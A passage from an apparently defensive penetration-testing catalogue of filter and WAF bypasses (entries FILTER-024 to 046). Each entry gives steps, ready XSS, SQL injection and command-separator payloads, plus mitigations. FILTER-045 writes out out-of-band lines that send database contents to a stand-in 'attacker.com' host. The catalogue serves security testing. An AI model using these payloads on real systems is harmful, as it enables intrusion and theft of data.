**Why It Works:** CSP trusts CDN domain; Angular provides template execution that bypasses CSP inline restrictions

**Impact:** Filter/WAF bypass enabling XSS — script executes in the victim's browser (session/token theft, account actions)

**Mitigation:** Use strict-dynamic with nonces; don't whitelist entire CDN domains

**Tools:** CSP Evaluator, browser

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); Sebastian Lekies &amp; Artur Janc research, PortSwigger

---

## FILTER-024 — Context-Breaking Encoding Bypass
**Test Category:** XSS · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Security Control Bypassed:** Output Encoding

**Where to Test / Injection Point:** XSS sink (reflected/stored/DOM) — behind Output Encoding

**How It Works:** Application HTML-encodes output but injection is in JavaScript/URL/CSS context where HTML encoding is insufficient

**Detection Method:** Identify the exact output context (HTML body/attribute/JS/CSS/URL)

**Test Steps:** 1. Submit canary string 2. Find where it's reflected 3. Determine context (inside &lt;script&gt;? inside href? inside style?) 4. Craft context-appropriate payload

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Output Encoding and reaches the sink — script executes in the victim's browser (session/token theft, account actions)

**Payload Example:**

```
In JS string: ';alert(1)// | In URL: javascript:alert(1) | In CSS: expression(alert(1)) | In HTML attr: " onfocus=alert(1) autofocus="
```

**Why It Works:** HTML encoding only prevents HTML injection; if output is in JS context you need JS encoding; in URL context need URL encoding etc.

**Impact:** Filter/WAF bypass enabling XSS — script executes in the victim's browser (session/token theft, account actions)

**Mitigation:** Apply context-aware output encoding: HTML-encode for HTML body; JS-encode for JS context; URL-encode for URLs

**Tools:** Burp Suite, manual code review

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); OWASP XSS Prevention Cheat Sheet, PortSwigger contexts

---

## FILTER-025 — Template Literal Bypass (ES6)
**Test Category:** XSS · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Security Control Bypassed:** Server-Side Blacklist

**Where to Test / Injection Point:** XSS sink (reflected/stored/DOM) — behind Server-Side Blacklist

**How It Works:** Use backtick template literals instead of parentheses/quotes which may be filtered

**Detection Method:** Try template literals when quotes and parens are blocked

**Test Steps:** 1. Confirm () and quotes are filtered 2. Use backtick template literals 3. Use tagged template for function calls

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Blacklist and reaches the sink — script executes in the victim's browser (session/token theft, account actions)

**Payload Example:**

```
alert`1` | setTimeout`alert\x28document.domain\x29` | location=`javascript:alert\x281\x29`
```

**Why It Works:** ES6 template literals use backticks not quotes; tagged templates call functions without parentheses

**Impact:** Filter/WAF bypass enabling XSS — script executes in the victim's browser (session/token theft, account actions)

**Mitigation:** Filter backticks and template literals; use CSP strict-dynamic

**Tools:** Burp Suite, modern browser

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger research, PayloadsAllTheThings

---

## FILTER-026 — SVG-Based XSS
**Test Category:** XSS · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Security Control Bypassed:** Server-Side Blacklist

**Where to Test / Injection Point:** XSS sink (reflected/stored/DOM) — behind Server-Side Blacklist

**How It Works:** Use SVG elements and events when standard HTML tags are filtered

**Detection Method:** Test if SVG tags are allowed by the filter

**Test Steps:** 1. Confirm HTML tags blocked 2. Try &lt;svg onload=alert(1)&gt; 3. Try &lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt; 4. Try SVG animate/set elements

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Blacklist and reaches the sink — script executes in the victim's browser (session/token theft, account actions)

**Payload Example:**

```
<svg onload=alert(1)> | <svg><animate onbegin=alert(1) attributeName=x> | <svg><set attributename=onmouseover value=alert(1)>
```

**Why It Works:** SVG is valid HTML5; many filters don't account for SVG-specific elements and their event handlers

**Impact:** Filter/WAF bypass enabling XSS — script executes in the victim's browser (session/token theft, account actions)

**Mitigation:** Include SVG tags in filter rules; use DOMPurify with SVG sanitization

**Tools:** Burp Suite

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS Cheat Sheet, HTML5sec.org

---

## FILTER-027 — MathML-Based XSS
**Test Category:** XSS · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Security Control Bypassed:** Server-Side Blacklist

**Where to Test / Injection Point:** XSS sink (reflected/stored/DOM) — behind Server-Side Blacklist

**How It Works:** Use MathML namespace elements for XSS when HTML/SVG filtered

**Detection Method:** Test MathML tags when other tags blocked

**Test Steps:** 1. Confirm HTML and SVG tags blocked 2. Try &lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;!--&lt;/style&gt;&lt;img src onerror=alert(1)&gt; 3. Test MathML mutation XSS

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Blacklist and reaches the sink — script executes in the victim's browser (session/token theft, account actions)

**Payload Example:**

```
<math><mtext><table><mglyph><style><!--</style><img src onerror=alert(1)>
```

**Why It Works:** MathML creates a namespace switch that confuses HTML sanitizers; parser differentials between server and browser

**Impact:** Filter/WAF bypass enabling XSS — script executes in the victim's browser (session/token theft, account actions)

**Mitigation:** Use browser-based sanitization (DOMPurify); keep sanitizer libraries updated

**Tools:** Burp Suite, browser

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); Mutation XSS research by Mario Heiderich, PortSwigger

---

## FILTER-028 — Intercept and Modify POST Data
**Test Category:** SQL Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Security Control Bypassed:** Client-Side Filter

**Where to Test / Injection Point:** SQL query parameter — behind Client-Side Filter

**How It Works:** Client validates input format but SQL injection payload sent via proxy after validation

**Detection Method:** Observe client-side validation on form fields

**Test Steps:** 1. Fill form with valid data (passes JS validation) 2. Intercept request in Burp 3. Modify parameter to SQLi payload 4. Forward

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Client-Side Filter and reaches the sink — injected SQL reaches the DB (authN bypass, data read/modify, potential RCE)

**Payload Example:**

```
id=1' OR 1=1-- (modified in intercepted request)
```

**Why It Works:** Client-side validation is only cosmetic; proxy allows modification after validation

**Impact:** Filter/WAF bypass enabling SQL Injection — injected SQL reaches the DB (authN bypass, data read/modify, potential RCE)

**Mitigation:** Always implement server-side parameterized queries

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); OWASP WSTG-INPV-05, WAHH Chapter 9

---

## FILTER-029 — Comment-Based Bypass
**Test Category:** SQL Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** Server-Side Blacklist Filter

**Where to Test / Injection Point:** SQL query parameter — behind Server-Side Blacklist Filter

**How It Works:** Filter blocks spaces or specific SQL keywords; use comments as whitespace or to split keywords

**Detection Method:** Test if spaces are filtered; try /**/ as replacement

**Test Steps:** 1. Send normal SQLi (blocked) 2. Replace spaces with /**/ 3. Try inline comments to split keywords

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Blacklist Filter and reaches the sink — injected SQL reaches the DB (authN bypass, data read/modify, potential RCE)

**Payload Example:**

```
1'/**/OR/**/1=1-- | 1'/*!50000UNION*//*!50000SELECT*/1,2,3-- | SELECT/*bypass*/password/**/FROM/**/users
```

**Why It Works:** SQL comments /**/ act as whitespace in SQL; MySQL version comments /*!50000*/ execute on specific versions; breaks keyword pattern matching

**Impact:** Filter/WAF bypass enabling SQL Injection — injected SQL reaches the DB (authN bypass, data read/modify, potential RCE)

**Mitigation:** Use parameterized queries; don't rely on keyword filtering

**Tools:** Burp Suite, sqlmap tamper scripts

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PayloadsAllTheThings SQLi, sqlmap tampers

---

## FILTER-030 — URL Encoding Bypass
**Test Category:** SQL Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** Server-Side Blacklist Filter

**Where to Test / Injection Point:** SQL query parameter — behind Server-Side Blacklist Filter

**How It Works:** Filter checks raw input but application URL-decodes before query construction

**Detection Method:** Try URL-encoded SQL keywords

**Test Steps:** 1. Send UNION SELECT (blocked) 2. URL encode: %55%4E%49%4F%4E %53%45%4C%45%43%54 3. Try double encode: %2555NION

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Blacklist Filter and reaches the sink — injected SQL reaches the DB (authN bypass, data read/modify, potential RCE)

**Payload Example:**

```
1%27%20OR%201%3D1-- | %55NION%20%53ELECT | %252f%252a*/UNION%252f%252a*/SELECT
```

**Why It Works:** URL decoding happens after WAF/filter inspection; filter sees encoded chars not SQL keywords

**Impact:** Filter/WAF bypass enabling SQL Injection — injected SQL reaches the DB (authN bypass, data read/modify, potential RCE)

**Mitigation:** Decode/normalize input before filtering; use parameterized queries

**Tools:** Burp Suite, CyberChef

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); OWASP SQL Injection Bypass

---

## FILTER-031 — Hex Encoding Bypass
**Test Category:** SQL Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** Server-Side Blacklist Filter

**Where to Test / Injection Point:** SQL query parameter — behind Server-Side Blacklist Filter

**How It Works:** Use hex-encoded strings instead of quoted strings to bypass string filters

**Detection Method:** Try hex encoding for string values in SQL payload

**Test Steps:** 1. Send SELECT 'admin' (blocked) 2. Replace string with hex: SELECT 0x61646D696E 3. Test in WHERE clause

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Blacklist Filter and reaches the sink — injected SQL reaches the DB (authN bypass, data read/modify, potential RCE)

**Payload Example:**

```
1' UNION SELECT 0x61646D696E,0x70617373776F7264-- | WHERE username=0x61646D696E
```

**Why It Works:** MySQL/MSSQL accept hex literals as string values; bypasses quote and string keyword filters

**Impact:** Filter/WAF bypass enabling SQL Injection — injected SQL reaches the DB (authN bypass, data read/modify, potential RCE)

**Mitigation:** Parameterized queries; don't filter string content manually

**Tools:** Burp Suite, sqlmap

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PayloadsAllTheThings, sqlmap

---

## FILTER-032 — CHAR() Function Bypass
**Test Category:** SQL Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** Server-Side Blacklist Filter

**Where to Test / Injection Point:** SQL query parameter — behind Server-Side Blacklist Filter

**How It Works:** Use CHAR() function to construct strings character by character avoiding quote filters

**Detection Method:** Try CHAR() when quotes are blocked

**Test Steps:** 1. Confirm quotes filtered 2. Use CHAR(97,100,109,105,110) instead of 'admin' 3. Concatenate with + or CONCAT()

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Blacklist Filter and reaches the sink — injected SQL reaches the DB (authN bypass, data read/modify, potential RCE)

**Payload Example:**

```
1' UNION SELECT CONCAT(CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110)),2-- | WHERE name=CHAR(97,100,109,105,110)
```

**Why It Works:** CHAR() constructs strings from ASCII values without needing quotes; filter can't detect the resulting string

**Impact:** Filter/WAF bypass enabling SQL Injection — injected SQL reaches the DB (authN bypass, data read/modify, potential RCE)

**Mitigation:** Use parameterized queries; CHAR() bypasses string-based filters

**Tools:** Burp Suite, sqlmap --tamper=charencode

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PayloadsAllTheThings

---

## FILTER-033 — Case Alternation and Concatenation
**Test Category:** SQL Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** Server-Side Blacklist Filter

**Where to Test / Injection Point:** SQL query parameter — behind Server-Side Blacklist Filter

**How It Works:** Alternate case and split keywords to bypass case-sensitive keyword filters

**Detection Method:** Try mixed case: SeLeCt UnIoN

**Test Steps:** 1. Send UNION SELECT (blocked) 2. Try uNiOn SeLeCt 3. Try string concat: 'SEL' + 'ECT'

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Blacklist Filter and reaches the sink — injected SQL reaches the DB (authN bypass, data read/modify, potential RCE)

**Payload Example:**

```
uNiOn SeLeCt 1,2,3-- | UN/**/ION SE/**/LECT 1,2-- | 1' oR 1=1--
```

**Why It Works:** Case-insensitive SQL execution but case-sensitive filter matching; comment-based splitting breaks pattern

**Impact:** Filter/WAF bypass enabling SQL Injection — injected SQL reaches the DB (authN bypass, data read/modify, potential RCE)

**Mitigation:** Case-insensitive filtering with parameterized queries

**Tools:** Burp Suite, sqlmap tamper=randomcase

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PayloadsAllTheThings SQLi

---

## FILTER-034 — Alternative UNION Techniques
**Test Category:** SQL Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** Server-Side Blacklist Filter

**Where to Test / Injection Point:** SQL query parameter — behind Server-Side Blacklist Filter

**How It Works:** When UNION is blocked use alternative data exfiltration: subqueries/error-based/blind/OOB

**Detection Method:** Try subquery injection when UNION blocked

**Test Steps:** 1. Confirm UNION blocked 2. Try error-based: AND 1=CONVERT(int,(SELECT password FROM users)) 3. Try blind: AND SUBSTRING(@@version,1,1)='5' 4. Try time: AND SLEEP(5)

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Blacklist Filter and reaches the sink — injected SQL reaches the DB (authN bypass, data read/modify, potential RCE)

**Payload Example:**

```
AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1))) | AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)
```

**Why It Works:** UNION keyword may be blocked but subqueries in WHERE/HAVING clauses use different syntax; error/blind/time methods don't need UNION

**Impact:** Filter/WAF bypass enabling SQL Injection — injected SQL reaches the DB (authN bypass, data read/modify, potential RCE)

**Mitigation:** Block all injection vectors not just UNION; use parameterized queries

**Tools:** sqlmap --technique=BEST, Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi labs, OWASP

---

## FILTER-035 — ModSecurity CRS Bypass - Scientific Notation
**Test Category:** SQL Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** WAF (ModSecurity CRS)

**Where to Test / Injection Point:** SQL query parameter — behind WAF (ModSecurity CRS)

**How It Works:** Use scientific notation for numbers to bypass numeric pattern detection

**Detection Method:** Try 1e0 instead of 1 in SQL context

**Test Steps:** 1. Send OR 1=1 (blocked by CRS) 2. Try OR 1e0=1e0 3. Try OR 0x1=0x01

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades WAF (ModSecurity CRS) and reaches the sink — injected SQL reaches the DB (authN bypass, data read/modify, potential RCE)

**Payload Example:**

```
OR 1e0=1e0-- | OR 0x1=0x1-- | AND 1e0 LIKE 1e0--
```

**Why It Works:** ModSecurity CRS may not match numeric tautologies using scientific or hex notation

**Impact:** Filter/WAF bypass enabling SQL Injection — injected SQL reaches the DB (authN bypass, data read/modify, potential RCE)

**Mitigation:** Update CRS rules; use latest CRS version; parameterized queries

**Tools:** Burp Suite, sqlmap tamper

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); ModSecurity CRS bypass research

---

## FILTER-036 — ModSecurity Bypass - Overlong UTF-8
**Test Category:** SQL Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** WAF (ModSecurity CRS)

**Where to Test / Injection Point:** SQL query parameter — behind WAF (ModSecurity CRS)

**How It Works:** Send overlong UTF-8 encoding of characters to bypass WAF Unicode handling

**Detection Method:** Try overlong UTF-8 for quotes and keywords

**Test Steps:** 1. Encode ' (0x27) as overlong UTF-8: 0xC0 0xA7 2. Send overlong encoded payload 3. Check if WAF passes but app decodes

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades WAF (ModSecurity CRS) and reaches the sink — injected SQL reaches the DB (authN bypass, data read/modify, potential RCE)

**Payload Example:**

```
0xC0 0xA7 (overlong ') | 0xC0 0xAF (overlong /)
```

**Why It Works:** Some WAFs don't properly validate/reject overlong UTF-8 sequences; application may decode them to valid characters

**Impact:** Filter/WAF bypass enabling SQL Injection — injected SQL reaches the DB (authN bypass, data read/modify, potential RCE)

**Mitigation:** WAF should reject overlong UTF-8; validate Unicode strictly

**Tools:** Custom Python script, Burp

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); Unicode attack research, RFC 3629

---

## FILTER-037 — HTTP/2 Pseudo-Header Injection
**Test Category:** SQL Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** WAF (Generic)

**Where to Test / Injection Point:** SQL query parameter — behind WAF (Generic)

**How It Works:** Exploit HTTP/2 binary framing to bypass WAF that only inspects HTTP/1.1

**Detection Method:** Test if WAF properly inspects HTTP/2 requests

**Test Steps:** 1. Send SQLi via HTTP/1.1 (blocked) 2. Force HTTP/2 connection 3. Send same payload via HTTP/2 4. Check if WAF misses it

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades WAF (Generic) and reaches the sink — injected SQL reaches the DB (authN bypass, data read/modify, potential RCE)

**Payload Example:**

```
Same payload sent over HTTP/2 instead of HTTP/1.1
```

**Why It Works:** Many WAFs downgrade HTTP/2 to HTTP/1.1 for inspection; during this conversion edge cases may cause inspection failures

**Impact:** Filter/WAF bypass enabling SQL Injection — injected SQL reaches the DB (authN bypass, data read/modify, potential RCE)

**Mitigation:** Ensure WAF fully supports HTTP/2 inspection; test with HTTP/2

**Tools:** Burp Suite (HTTP/2), h2csmuggler

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); James Kettle HTTP/2 research, PortSwigger

---

## FILTER-038 — JSON-Based SQL Injection
**Test Category:** SQL Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** WAF (Generic)

**Where to Test / Injection Point:** SQL query parameter — behind WAF (Generic)

**How It Works:** Send SQL injection via JSON body which WAF may not inspect deeply

**Detection Method:** Test SQLi in JSON parameter values

**Test Steps:** 1. Send POST with Content-Type: application/json 2. Place SQLi in JSON value: {"id":"1' OR 1=1--"} 3. Check if WAF inspects JSON

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades WAF (Generic) and reaches the sink — injected SQL reaches the DB (authN bypass, data read/modify, potential RCE)

**Payload Example:**

```
POST {"username":"admin' OR 1=1--","password":"x"} | {"id":"1 UNION SELECT 1,2,3--"}
```

**Why It Works:** Some WAFs focus on form-urlencoded and don't deeply parse JSON bodies

**Impact:** Filter/WAF bypass enabling SQL Injection — injected SQL reaches the DB (authN bypass, data read/modify, potential RCE)

**Mitigation:** WAF must parse and inspect all Content-Types including JSON

**Tools:** Burp Suite, sqlmap (--data with JSON)

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); Team82 Claroty WAF bypass research 2022

---

## FILTER-039 — Multiline Payload with Line Breaks
**Test Category:** SQL Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** WAF (Generic)

**Where to Test / Injection Point:** SQL query parameter — behind WAF (Generic)

**How It Works:** Break SQL payload across multiple lines using %0a (newline) to bypass single-line pattern matching

**Detection Method:** Try inserting newlines within SQL payload

**Test Steps:** 1. Send single-line SQLi (blocked) 2. Insert %0a (newline) between keywords 3. Send multiline payload

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades WAF (Generic) and reaches the sink — injected SQL reaches the DB (authN bypass, data read/modify, potential RCE)

**Payload Example:**

```
1'%0aOR%0a1=1-- | 1'%0aUNION%0aSELECT%0a1,2,3--
```

**Why It Works:** Many WAF regex patterns match single-line; newlines break the pattern but SQL ignores whitespace/newlines

**Impact:** Filter/WAF bypass enabling SQL Injection — injected SQL reaches the DB (authN bypass, data read/modify, potential RCE)

**Mitigation:** WAF regex should use DOTALL/multiline mode; inspect normalized payload

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PayloadsAllTheThings WAF Bypass

---

## FILTER-040 — Piggybacked Query via HPP
**Test Category:** SQL Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** WAF (Generic)

**Where to Test / Injection Point:** SQL query parameter — behind WAF (Generic)

**How It Works:** Use HTTP Parameter Pollution to split SQL across parameters

**Detection Method:** Test if multiple same-name params are concatenated

**Test Steps:** 1. Send id=1 UNION SELECT (blocked) 2. Try id=1 UNION&amp;id=SELECT 1,2,3 3. Check if app concatenates parameters

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades WAF (Generic) and reaches the sink — injected SQL reaches the DB (authN bypass, data read/modify, potential RCE)

**Payload Example:**

```
id=1'+UNION/*&id=*/SELECT+1,password+FROM+users--
```

**Why It Works:** ASP.NET/IIS concatenates duplicate parameters with comma; WAF checks each independently

**Impact:** Filter/WAF bypass enabling SQL Injection — injected SQL reaches the DB (authN bypass, data read/modify, potential RCE)

**Mitigation:** Reject duplicate parameters; WAF should inspect concatenated values

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); Luca Carettoni HPP research, OWASP HPP

---

## FILTER-041 — Fragmented Packet Bypass
**Test Category:** SQL Injection · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Security Control Bypassed:** IDS/IPS

**Where to Test / Injection Point:** SQL query parameter — behind IDS/IPS

**How It Works:** Fragment TCP packets so IDS/IPS cannot reassemble and detect SQL injection signature

**Detection Method:** Use packet fragmentation tools to split payload

**Test Steps:** 1. Craft SQLi payload 2. Use fragroute/nmap to fragment at TCP level 3. Check if IDS alerts 4. Verify payload reaches app intact

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades IDS/IPS and reaches the sink — injected SQL reaches the DB (authN bypass, data read/modify, potential RCE)

**Payload Example:**

```
fragroute: tcp_seg 8 (fragment every 8 bytes) | nmap --mtu 8
```

**Why It Works:** IDS/IPS may not reassemble fragmented packets; each fragment too small to contain complete signature

**Impact:** Filter/WAF bypass enabling SQL Injection — injected SQL reaches the DB (authN bypass, data read/modify, potential RCE)

**Mitigation:** IDS should perform full TCP stream reassembly; set reassembly timeout

**Tools:** fragroute, nmap, Scapy

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); Network Security Monitoring, IDS evasion techniques

---

## FILTER-042 — Wildcard Bypass for MySQL
**Test Category:** SQL Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** WAF (Generic)

**Where to Test / Injection Point:** SQL query parameter — behind WAF (Generic)

**How It Works:** Use MySQL wildcards and alternative syntax when standard keywords blocked

**Detection Method:** Test MySQL-specific alternative syntax

**Test Steps:** 1. INFORMATION_SCHEMA blocked? Try: /*!information_schema*/ 2. SELECT blocked? Try: /*!50000SELECT*/ 3. Use MySQL specific functions

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades WAF (Generic) and reaches the sink — injected SQL reaches the DB (authN bypass, data read/modify, potential RCE)

**Payload Example:**

```
/*!50000UNION*/+/*!50000SELECT*/+1,2,3 | SELECT password FROM users WHERE name LIKE 0x61646D25
```

**Why It Works:** MySQL-specific comment syntax /*!50000...*/ executes content on MySQL 5.00.00+; unique to MySQL and often not in WAF rules

**Impact:** Filter/WAF bypass enabling SQL Injection — injected SQL reaches the DB (authN bypass, data read/modify, potential RCE)

**Mitigation:** Block MySQL comment syntax; parameterized queries; test with MySQL-specific patterns

**Tools:** sqlmap --tamper=versionedmorekeywords, Burp

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); MySQL documentation, PayloadsAllTheThings

---

## FILTER-043 — Blind Boolean-Based Extraction
**Test Category:** SQL Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** No Direct SQLi Possible

**Where to Test / Injection Point:** SQL query parameter — behind No Direct SQLi Possible

**How It Works:** When no direct output; use true/false conditions to extract data bit by bit

**Detection Method:** Look for any response difference between true/false conditions

**Test Steps:** 1. Send AND 1=1 (true) → observe response 2. Send AND 1=2 (false) → observe difference 3. Use SUBSTRING to extract char by char 4. Automate

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades No Direct SQLi Possible and reaches the sink — injected SQL reaches the DB (authN bypass, data read/modify, potential RCE)

**Payload Example:**

```
1' AND SUBSTRING(database(),1,1)='a'-- | 1' AND (SELECT COUNT(*) FROM users)>0-- | 1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>77--
```

**Why It Works:** Even without visible output; application behavior differs based on query truth value (content/status/redirect)

**Impact:** Filter/WAF bypass enabling SQL Injection — injected SQL reaches the DB (authN bypass, data read/modify, potential RCE)

**Mitigation:** Parameterized queries; WAF time-based correlation

**Tools:** sqlmap --technique=B, Burp Intruder

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Blind SQLi labs, OWASP WSTG

---

## FILTER-044 — Time-Based Blind Extraction
**Test Category:** SQL Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** No Direct SQLi Possible

**Where to Test / Injection Point:** SQL query parameter — behind No Direct SQLi Possible

**How It Works:** When no visible response difference; use time delays to infer true/false

**Detection Method:** Measure response times for conditional delays

**Test Steps:** 1. Send AND SLEEP(5) → measure if response delayed 2. Send AND IF(1=1,SLEEP(5),0) → delayed=true 3. Extract data: AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades No Direct SQLi Possible and reaches the sink — injected SQL reaches the DB (authN bypass, data read/modify, potential RCE)

**Payload Example:**

```
MySQL: AND SLEEP(5)-- | MSSQL: WAITFOR DELAY '0:0:5'-- | PostgreSQL: AND pg_sleep(5)-- | Oracle: AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1
```

**Why It Works:** Time delay is measurable regardless of response content; conditional delay confirms injection and allows data extraction

**Impact:** Filter/WAF bypass enabling SQL Injection — injected SQL reaches the DB (authN bypass, data read/modify, potential RCE)

**Mitigation:** Parameterized queries; detect unusual query execution times

**Tools:** sqlmap --technique=T, Burp

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Time-Based SQLi, OWASP

---

## FILTER-045 — Out-of-Band (OOB) Extraction
**Test Category:** SQL Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** No Direct SQLi Possible

**Where to Test / Injection Point:** SQL query parameter — behind No Direct SQLi Possible

**How It Works:** When no response difference and time-based unreliable; use DNS/HTTP to exfiltrate data

**Detection Method:** Test DB functions that make network requests

**Test Steps:** 1. Set up DNS listener (Burp Collaborator/interactsh) 2. Inject DNS lookup with data: LOAD_FILE or xp_dirtree 3. Monitor for incoming DNS query with data

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades No Direct SQLi Possible and reaches the sink — injected SQL reaches the DB (authN bypass, data read/modify, potential RCE)

**Payload Example:**

```
MySQL: LOAD_FILE(CONCAT('\\\\\\\\',database(),'.attacker.com\\\\a')) | MSSQL: EXEC master..xp_dirtree '\\\\\\\\'+@@version+'.attacker.com\\\\a' | Oracle: UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual))
```

**Why It Works:** Database makes DNS/HTTP request to attacker-controlled server; DNS query label contains exfiltrated data

**Impact:** Filter/WAF bypass enabling SQL Injection — injected SQL reaches the DB (authN bypass, data read/modify, potential RCE)

**Mitigation:** Block outbound network from DB server; parameterized queries; network segmentation

**Tools:** sqlmap --technique=O, Burp Collaborator, interactsh

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger OOB SQLi, OWASP

---

## FILTER-046 — Alternative Command Separators
**Test Category:** Command Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Security Control Bypassed:** Server-Side Blacklist Filter

**Where to Test / Injection Point:** param reaching OS command — behind Server-Side Blacklist Filter

**How It Works:** Semicolon blocked; use other command separators: | || &amp; &amp;&amp; newline

**Detection Method:** Try all command separator characters

**Test Steps:** 1. Send ;id (blocked) 2. Try |id 3. Try ||id 4. Try &amp;id 5. Try &amp;&amp;id 6. Try %0aid (newline) 7. Try `id` (backticks)

